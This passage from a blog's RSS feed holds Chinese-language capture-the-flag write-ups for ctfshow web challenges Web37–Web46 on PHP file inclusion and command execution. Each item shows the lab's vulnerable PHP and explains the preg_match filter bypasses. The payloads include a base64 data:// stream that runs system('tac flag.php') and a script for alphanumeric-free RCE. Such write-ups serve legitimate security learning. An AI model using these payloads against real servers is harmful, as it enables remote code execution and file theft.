+&lt;p&gt;审计代码，发现这题改变方法，使用&lt;code&gt;include&lt;/code&gt;方法包含$c,同时因为过滤flag，无法直接使用&lt;code&gt;php://filter/read=convert.base64-encode/resource=flag.php&lt;/code&gt;,使用&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5CPHP_%E4%BC%AA%E5%8D%8F%E8%AE%AE.md&#34;&gt;data://text/plain;base64,XXXXX&lt;/a&gt;来构造payload&lt;/p&gt;
+&lt;p&gt;提交payload&lt;code&gt;?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;获得flag&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web38</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web38/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web38/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250304205558307&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250304205558307.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 05:23:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|php|file/i&amp;#34;, $c)){
+        include($c);
+        echo $flag;
+    
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;0x02&lt;/p&gt;
+&lt;p&gt;代码审计,新增&lt;code&gt;file&lt;/code&gt;过滤字段，可继续沿用Web37解法&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web39</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web39/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web39/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250304210953481&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250304210953481.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 06:13:21
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag/i&amp;#34;, $c)){
+        include($c.&amp;#34;.php&amp;#34;);
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;由于此处在&lt;code&gt;$c&lt;/code&gt;后拼接了&lt;code&gt;.php&lt;/code&gt;，故直接使用&lt;code&gt;data://text/plain,&amp;lt;php? system(&#39;tac f*&#39;);?&amp;gt;&lt;/code&gt;而非base64加密形式。从而闭合&lt;code&gt;&amp;lt;?php?&amp;gt;&lt;/code&gt;其余均与前题相同&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web40</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250304215946163&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250304215946163.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;RCE无参构造&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 06:03:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&amp;#39;|\&amp;#34;|\,|\&amp;lt;|\.|\&amp;gt;|\/|\?|\\\\/i&amp;#34;, $c)){
+        eval($c);
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;代码审计，此题并不像前几题一样告知flag.php&lt;/p&gt;
+&lt;p&gt;过滤的符号有0-9,~,`,$,%,*,（中文,）中文,-,=,{,[,],},:,,,&amp;rsquo;,&amp;quot;,&amp;lt;,&amp;gt;,.,/,?,\&lt;/p&gt;
+&lt;p&gt;过滤了很多字符 有大写得括号 这里得考点是：无参数文件读取&lt;/p&gt;
+&lt;p&gt;无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(&amp;lsquo;b&amp;rsquo;)或a(&amp;lsquo;b&amp;rsquo;,&amp;lsquo;c&amp;rsquo;)，不能带参数&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;localeconv()&lt;/code&gt; 函数返回一包含本地数字及货币格式信息的数组。
+&lt;code&gt;current()&lt;/code&gt; 函数返回数组中的当前元素（单元）,默认取第一个值，
+&lt;code&gt;pos()&lt;/code&gt; 同 current() ,是current()的别名
+&lt;code&gt;reset()&lt;/code&gt; 函数返回数组第一个单元的值，如果数组为空则返回 FALSE
+&lt;code&gt;array_reverse()&lt;/code&gt;数组逆序
+&lt;code&gt;array_flip()&lt;/code&gt;是交换数组的键和值&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web41</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250306131136955&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306131136955.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;RCE无字母数字构造_或&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: 羽
+# @Date:   2020-09-05 20:31:22
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:40:07
+# @email: 1341963450@qq.com
+# @link: https://ctf.show
+
+*/
+
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+    $c = $_POST[&amp;#39;c&amp;#39;];
+if(!preg_match(&amp;#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;amp;|\-/i&amp;#39;, $c)){
+        eval(&amp;#34;echo($c);&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;代码审计可知，数字字母字段被过滤，同时过滤了一些字符，异或^，~取反均无法使用。&lt;code&gt;()&lt;/code&gt; &lt;code&gt;|&lt;/code&gt;未被过滤，故可以采取&lt;a href=&#34;......%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce.md&#34;&gt;或方法构造函数payload&lt;/a&gt;，编写脚本&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;或运算字符php生成脚本rec_or.php，输出可字符化且&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+$myfile = fopen(&amp;#34;rce_or.txt&amp;#34;, &amp;#34;w&amp;#34;);
+$contents=&amp;#34;&amp;#34;;
+for ($i=0; $i &amp;lt; 256; $i++) { 
+	for ($j=0; $j &amp;lt;256 ; $j++) { 
+
+		if($i&amp;lt;16){
+			$hex_i=&amp;#39;0&amp;#39;.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j&amp;lt;16){
+			$hex_j=&amp;#39;0&amp;#39;.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		$preg = &amp;#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;amp;|\-/i&amp;#39;;
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					continue;
+    }
+  
+		else{
+		$a=&amp;#39;%&amp;#39;.$hex_i;
+		$b=&amp;#39;%&amp;#39;.$hex_j;.
+		$c=(urldecode($a)|urldecode($b));
+		if (ord($c)&amp;gt;=32&amp;amp;ord($c)&amp;lt;=126) {
+			$contents=$contents.$c.&amp;#34; &amp;#34;.$a.&amp;#34; &amp;#34;.$b.&amp;#34;\n&amp;#34;;
+		}
+	}
+
+}
+}
+fwrite($myfile,$contents);
+fclose($myfile);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;自动化传参python脚本exp.py&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web42</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web42/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web42/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250306185145733&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306185145733.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 20:51:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;审计源码&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!note]&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;代表重定向到哪里
+&lt;code&gt;/dev/null&lt;/code&gt; 代表空设备文件
+&lt;code&gt;2&amp;gt;&lt;/code&gt; 表示stderr标准错误
+&lt;code&gt;&amp;amp;&lt;/code&gt; 表示等同于的意思，2&amp;gt;&amp;amp;1，表示2的输出重定向等同于1
+&lt;code&gt;1&lt;/code&gt; 表示stdout标准输出，系统默认值是1，所以&lt;code&gt;&amp;gt;/dev/null&lt;/code&gt;等同于 1&amp;gt;/dev/null
+因此，&lt;code&gt;&amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/code&gt; 也可以写成1&amp;gt; /dev/null 2&amp;gt; &amp;amp;1&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web43</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web43/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web43/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250306192629923&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306192629923.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;RCE_preg_match绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;代码审计&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/\;|cat/i&amp;#34;&lt;/span&gt;, $c)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过滤字段&lt;code&gt;; cat&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;且将输出结果重定向&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;故构造payload思路为绕过&lt;code&gt;cat ;&lt;/code&gt;且截断 &lt;code&gt;&amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0X03&lt;/h2&gt;
+&lt;p&gt;payload尝试过程与Web42相同，不再赘述&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250306193531417&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306193531417.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web44</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web44/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web44/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250306193930782&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306193930782.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:01
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/;|cat|flag/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;代码审计&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/;|cat|flag/i&amp;#34;&lt;/span&gt;, $c)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;preg_match函数过滤&lt;code&gt;; cat flag&lt;/code&gt;字段及大小写&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/code&gt;将输出结果重定向不显示&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;故构造payload函数思路为绕过preg_match及截断重定向&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;构造payload传参，具体过程与Web42类似，不再赘述&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250306195207224&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306195207224.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web45</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web45/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web45/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250306195446554&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306195446554.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:35:34
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| /i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;代码审计，过滤了&lt;code&gt;; cat flag &#39;Space&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;标准输出被重定向&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;故此处采用&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;替代&lt;code&gt;;&lt;/code&gt;，&lt;code&gt;Tab&lt;/code&gt;替代&lt;code&gt;Space&lt;/code&gt;（&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2.md&#34;&gt;常用字符替换&lt;/a&gt;）的形式构造payload&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;省略目录查看过程，访问flag.php获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250308163031118&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308163031118.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web46</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web46/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web46/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250308163251126&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308163251126.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:50:19
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\\$|\*/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;审计源码&lt;/p&gt;
+&lt;p&gt;过滤参数&lt;code&gt;cat ; flag &#39;Space&#39; [0-9] $ *&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;标准输出被重定向&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;与Web45雷同，只需将f*.php替换为f?.php即可，不再赘述&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250308164205539&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308164205539.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web47</title>
